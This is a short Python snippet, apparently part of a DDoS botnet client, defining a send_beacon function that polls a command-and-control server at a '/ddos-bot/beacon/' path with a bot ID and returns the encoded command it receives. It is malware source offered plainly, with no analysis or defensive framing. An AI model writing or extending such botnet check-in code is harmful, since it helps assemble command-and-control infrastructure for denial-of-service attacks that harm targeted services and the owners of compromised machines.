import requests
# import base64

def send_beacon(c2_url, bot_id):
    try:
        response = requests.get(f"{c2_url}/ddos-bot/beacon/{bot_id}")
        if response.status_code == 200:
            encoded_command = response.content.decode()
            return encoded_command
        return None
    except requests.RequestException as e:
        print(f"Beacon error: {e}")
        return None